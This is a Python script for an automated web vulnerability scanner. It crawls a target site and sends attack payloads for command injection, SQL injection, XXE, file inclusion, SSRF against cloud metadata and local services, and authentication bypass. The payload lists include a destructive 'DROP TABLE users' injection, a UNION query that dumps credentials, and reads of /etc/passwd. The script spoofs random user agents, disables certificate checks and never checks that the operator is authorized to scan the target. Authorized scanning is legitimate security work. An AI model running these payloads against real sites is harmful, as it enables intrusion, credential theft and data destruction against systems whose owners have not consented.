#!/usr/bin/env python3
import sys
import threading
import time
import re
import argparse
import os
import json
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict

# Check for required libraries
try:
    import requests
    from bs4 import BeautifulSoup
    from colorama import init, Fore, Style
    from fake_useragent import UserAgent
    from tldextract import extract
except ImportError as e:
    print(f"❌ Error: {e}")
    print("💡 Run: pip install requests beautifulsoup4 colorama fake_useragent tldextract")
    sys.exit(1)

# Initialize Colorama
init(autoreset=True)

# ========== CONFIGURATION ==========
DEFAULT_THREADS = 10
DEFAULT_DEPTH = 2
DEFAULT_TIMEOUT = 15
REPORT_DIR = "vulnerability_reports"
CRITICAL_SEVERITY = ["Critical", "High"]

# ========== PAYLOADS ==========
CRITICAL_PAYLOADS = {
    "RCE": [
        ";id;",
        "|id|",
        "`id`",
        "$(id)",
        "{{id}}",
        "<?php system('id'); ?>",
        "<% Runtime.getRuntime().exec(\"id\") %>"
    ],
    "SQLi": [
        "' OR 1=1-- -",
        "' UNION SELECT null,username,password FROM users-- -",
        "' WAITFOR DELAY '0:0:10'--",
        "' OR SLEEP(5)-- -",
        "1'; DROP TABLE users-- -"
    ],
    "XXE": [
        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
    ],
    "LFI": [
        "../../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
        "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini"
    ],
    "SSRF": [
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost/admin",
        "file:///etc/passwd",
        "gopher://127.0.0.1:6379/_INFO"
    ],
    "AuthBypass": [
        "/admin/..;/",
        "/.%2e/admin",
        "/admin..%2f",
        "/admin?debug=true",
        "/admin#"
    ]
}

# ========== UI & LOGGING ==========
class UI:
    @staticmethod
    def banner():
        print(Fore.RED + Style.BRIGHT + r"""
╔════════════════════════════════════════════════════════════╗
║   ██████╗██████╗ ██╗████████╗██╗ ██████╗ █████╗ ██╗       ║
║  ██╔════╝██╔══██╗██║╚══██╔══╝██║██╔════╝██╔══██╗██║       ║
║  ██║     ██████╔╝██║   ██║   ██║██║     ███████║██║       ║
║  ██║     ██╔══██╗██║   ██║   ██║██║     ██╔══██║██║       ║
║  ╚██████╗██║  ██║██║   ██║   ██║╚██████╗██║  ██║███████╗  ║
║   ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝ ╚═════╝╚═╝ ╚═╝╚══════╝  ║
╠════════════════════════════════════════════════════════════╣
║          Critical Vulnerability Scanner v2.0               ║
║               [Authorized Use Only]                        ║
╚════════════════════════════════════════════════════════════╝
""")

    @staticmethod
    def status(message, level="info"):
        colors = {
            "info": Fore.BLUE,
            "success": Fore.GREEN,
            "warning": Fore.YELLOW,
            "error": Fore.RED,
            "critical": Fore.RED + Style.BRIGHT
        }
        symbols = {
            "info": "[ℹ]",
            "success": "[✓]",
            "warning": "[!]",
            "error": "[✗]",
            "critical": "[☠]"
        }
        print(f"{Fore.WHITE}[{time.strftime('%H:%M:%S')}] {colors.get(level, Fore.WHITE)}{symbols.get(level, '')} {message}")

    @staticmethod
    def display_vuln(vuln):
        print("\n" + "═" * 80)
        print(f"{Fore.RED + Style.BRIGHT}☠ CRITICAL {vuln['type']} DETECTED!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}🔗 URL:{Style.RESET_ALL} {vuln['url']}")
        print(f"{Fore.CYAN}📦 Payload:{Style.RESET_ALL} {vuln['payload']}")
        if 'parameter' in vuln:
            print(f"{Fore.CYAN}⚙ Parameter:{Style.RESET_ALL} {vuln['parameter']}")
        if 'evidence' in vuln:
            print(f"{Fore.CYAN}📝 Evidence:{Style.RESET_ALL} {vuln['evidence'][:200]}...")
        print(f"{Fore.RED + Style.BRIGHT}💀 Severity:{Style.RESET_ALL} {vuln['severity']}")
        print("═" * 80)

# ========== SCANNER CORE ==========
class CriticalScanner:
    def __init__(self):
        self.stop_event = threading.Event()
        self.visited = set()
        self.lock = threading.Lock()
        self.critical_findings = []
        self.session = requests.Session()
        self.ua = UserAgent()
        self.session.headers.update({
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        self.session.verify = False  # For testing purposes only
        requests.packages.urllib3.disable_warnings()

    def is_critical(self, response, payload_type):
        """Determine if the response indicates a critical vulnerability"""
        indicators = {
            "RCE": ["uid=", "gid=", "groups=", "root:", "Microsoft Windows"],
            "SQLi": ["SQL syntax", "MySQL server", "ORA-", "PostgreSQL", "syntax error"],
            "XXE": ["root:", "daemon:", "/bin/bash"],
            "LFI": ["root:", "daemon:", "[boot loader]", "extension="],
            "SSRF": ["AMI ID", "instance-id", "[boot loader]"],
            "AuthBypass": ["Admin Dashboard", "Welcome, admin", "Administrator Panel"]
        }
        
        if response.status_code in [200, 201, 202, 203, 301, 302, 307, 401, 403, 500]:
            content = response.text.lower()
            for indicator in indicators.get(payload_type, []):
                if indicator.lower() in content:
                    return True
        return False

    def scan_rce(self, url):
        """Remote Code Execution checks"""
        parsed = urlparse(url)
        
        # Check URL parameters
        if parsed.query:
            for param in parse_qs(parsed.query):
                for payload in CRITICAL_PAYLOADS["RCE"]:
                    try:
                        test_url = url.replace(f"{param}=", f"{param}={payload}")
                        res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                        if self.is_critical(res, "RCE"):
                            with self.lock:
                                self.critical_findings.append({
                                    "type": "Remote Code Execution",
                                    "url": test_url,
                                    "payload": payload,
                                    "parameter": param,
                                    "evidence": res.text,
                                    "severity": "Critical"
                                })
                                UI.display_vuln(self.critical_findings[-1])
                    except:
                        continue

    def scan_sqli(self, url):
        """SQL Injection checks"""
        parsed = urlparse(url)
        
        if parsed.query:
            for param in parse_qs(parsed.query):
                for payload in CRITICAL_PAYLOADS["SQLi"]:
                    try:
                        test_url = url.replace(f"{param}=", f"{param}={payload}")
                        res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                        if self.is_critical(res, "SQLi"):
                            with self.lock:
                                self.critical_findings.append({
                                    "type": "SQL Injection",
                                    "url": test_url,
                                    "payload": payload,
                                    "parameter": param,
                                    "evidence": res.text,
                                    "severity": "Critical"
                                })
                                UI.display_vuln(self.critical_findings[-1])
                    except:
                        continue

    def scan_xxe(self, url):
        """XXE Injection checks"""
        headers = {'Content-Type': 'application/xml'}
        for payload in CRITICAL_PAYLOADS["XXE"]:
            try:
                res = self.session.post(url, data=payload, headers=headers, timeout=DEFAULT_TIMEOUT)
                if self.is_critical(res, "XXE"):
                    with self.lock:
                        self.critical_findings.append({
                            "type": "XML External Entity (XXE)",
                            "url": url,
                            "payload": payload,
                            "evidence": res.text,
                            "severity": "Critical"
                        })
                        UI.display_vuln(self.critical_findings[-1])
            except:
                continue

    def scan_lfi(self, url):
        """Local File Inclusion checks"""
        for payload in CRITICAL_PAYLOADS["LFI"]:
            try:
                test_url = urljoin(url, payload)
                res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                if self.is_critical(res, "LFI"):
                    with self.lock:
                        self.critical_findings.append({
                            "type": "Local File Inclusion",
                            "url": test_url,
                            "payload": payload,
                            "evidence": res.text,
                            "severity": "High"
                        })
                        UI.display_vuln(self.critical_findings[-1])
            except:
                continue

    def scan_ssrf(self, url):
        """Server Side Request Forgery checks"""
        parsed = urlparse(url)
        
        if parsed.query:
            for param in parse_qs(parsed.query):
                for payload in CRITICAL_PAYLOADS["SSRF"]:
                    try:
                        test_url = url.replace(f"{param}=", f"{param}={payload}")
                        res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                        if self.is_critical(res, "SSRF"):
                            with self.lock:
                                self.critical_findings.append({
                                    "type": "Server Side Request Forgery",
                                    "url": test_url,
                                    "payload": payload,
                                    "parameter": param,
                                    "evidence": res.text,
                                    "severity": "High"
                                })
                                UI.display_vuln(self.critical_findings[-1])
                    except:
                        continue

    def scan_auth_bypass(self, url):
        """Authentication Bypass checks"""
        for payload in CRITICAL_PAYLOADS["AuthBypass"]:
            try:
                test_url = urljoin(url, payload)
                res = self.session.get(test_url, timeout=DEFAULT_TIMEOUT)
                if self.is_critical(res, "AuthBypass"):
                    with self.lock:
                        self.critical_findings.append({
                            "type": "Authentication Bypass",
                            "url": test_url,
                            "payload": payload,
                            "evidence": res.text,
                            "severity": "Critical"
                        })
                        UI.display_vuln(self.critical_findings[-1])
            except:
                continue

        # Test header-based bypasses
        bypass_headers = {
            "X-Original-URL": "/admin",
            "X-Rewrite-URL": "/admin",
            "X-Forwarded-For": "127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1"
        }
        
        for header, value in bypass_headers.items():
            try:
                headers = {header: value}
                res = self.session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
                if self.is_critical(res, "AuthBypass"):
                    with self.lock:
                        self.critical_findings.append({
                            "type": "Authentication Bypass (Header)",
                            "url": url,
                            "payload": f"{header}: {value}",
                            "evidence": res.text,
                            "severity": "Critical"
                        })
                        UI.display_vuln(self.critical_findings[-1])
            except:
                continue

    def scan_page(self, url):
        """Run all critical vulnerability checks on a single URL"""
        try:
            # Skip non-HTTP/HTTPS URLs
            if not url.startswith(('http://', 'https://')):
                return

            # Skip already visited URLs
            with self.lock:
                if url in self.visited:
                    return
                self.visited.add(url)

            UI.status(f"Scanning: {url}", "info")
            
            # Run all critical vulnerability scans
            self.scan_rce(url)
            self.scan_sqli(url)
            self.scan_xxe(url)
            self.scan_lfi(url)
            self.scan_ssrf(url)
            self.scan_auth_bypass(url)

        except Exception as e:
            UI.status(f"Error scanning {url}: {str(e)}", "error")

    def crawl(self, base_url, depth=DEFAULT_DEPTH, threads=DEFAULT_THREADS):
        """Crawl the website and scan each page"""
        try:
            # Start with the base URL
            self.scan_page(base_url)

            # Get all links from the base URL
            try:
                res = self.session.get(base_url, timeout=DEFAULT_TIMEOUT)
                soup = BeautifulSoup(res.text, 'html.parser')
                links = {urljoin(base_url, a['href']) for a in soup.find_all('a', href=True)}
            except:
                links = set()

            # Scan all found links
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for link in links:
                    if depth > 1:
                        executor.submit(self.crawl, link, depth-1, threads)
                    else:
                        executor.submit(self.scan_page, link)

        except KeyboardInterrupt:
            UI.status("Scan stopped by user", "error")
            self.stop_event.set()
        except Exception as e:
            UI.status(f"Crawling error: {str(e)}", "error")

    def generate_report(self):
        """Generate JSON and HTML reports"""
        if not os.path.exists(REPORT_DIR):
            os.makedirs(REPORT_DIR)

        timestamp = time.strftime('%Y%m%d_%H%M%S')
        
        # JSON Report
        json_report = {
            "metadata": {
                "scan_date": timestamp,
                "target": self.visited.pop() if self.visited else "Unknown",
                "vulnerabilities_found": len(self.critical_findings)
            },
            "findings": self.critical_findings
        }

        json_path = os.path.join(REPORT_DIR, f"critical_vulns_{timestamp}.json")
        with open(json_path, 'w') as f:
            json.dump(json_report, f, indent=2)

        # HTML Report
        html_path = os.path.join(REPORT_DIR, f"critical_vulns_{timestamp}.html")
        with open(html_path, 'w') as f:
            f.write("""
            <html>
            <head>
                <title>Critical Vulnerability Report</title>
                <style>
                    body { font-family: Arial, sans-serif; margin: 20px; }
                    .vuln { border: 1px solid #d33; margin: 10px 0; padding: 10px; border-radius: 5px; }
                    .critical { background-color: #ffdddd; }
                    .high { background-color: #ffe6e6; }
                    h1 { color: #d33; }
                    pre { white-space: pre-wrap; background: #f5f5f5; padding: 10px; }
                </style>
            </head>
            <body>
                <h1>Critical Vulnerability Report</h1>
                <p>Generated: {}</p>
                <p>Total Critical Vulnerabilities Found: {}</p>
            """.format(timestamp, len(self.critical_findings)))

            for vuln in self.critical_findings:
                f.write(f"""
                <div class="vuln {vuln['severity'].lower()}">
                    <h2>{vuln['type']} ({vuln['severity']})</h2>
                    <p><strong>URL:</strong> {vuln['url']}</p>
                    <p><strong>Payload:</strong> <code>{vuln['payload']}</code></p>
                    {f"<p><strong>Parameter:</strong> {vuln['parameter']}</p>" if 'parameter' in vuln else ""}
                    <p><strong>Evidence:</strong></p>
                    <pre>{vuln.get('evidence', 'No direct evidence captured')}</pre>
                </div>
                """)

            f.write("</body></html>")

        UI.status(f"Reports generated:\n- {json_path}\n- {html_path}", "success")

# ========== MAIN EXECUTION ==========
if __name__ == "__main__":
    UI.banner()
    scanner = CriticalScanner()
    
    parser = argparse.ArgumentParser(description="Critical Vulnerability Scanner")
    parser.add_argument("url", help="Target URL (e.g., http://example.com)")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, 
                       help=f"Number of threads (default: {DEFAULT_THREADS})")
    parser.add_argument("-d", "--depth", type=int, default=DEFAULT_DEPTH, 
                       help=f"Crawl depth (default: {DEFAULT_DEPTH})")
    parser.add_argument("-r", "--report", action="store_true", 
                       help="Generate detailed vulnerability report")
    args = parser.parse_args()

    try:
        UI.status(f"Starting critical vulnerability scan on {args.url}", "info")
        scanner.crawl(args.url, depth=args.depth, threads=args.threads)
        
        if args.report:
            scanner.generate_report()
        
        if not scanner.critical_findings:
            UI.status("No CRITICAL vulnerabilities found!", "success")
        else:
            UI.status(f"Scan complete! Found {len(scanner.critical_findings)} CRITICAL vulnerabilities!", "critical")
                
    except KeyboardInterrupt:
        UI.status("Scan stopped by user", "error")
    except Exception as e:
        UI.status(f"Fatal error: {e}", "error")
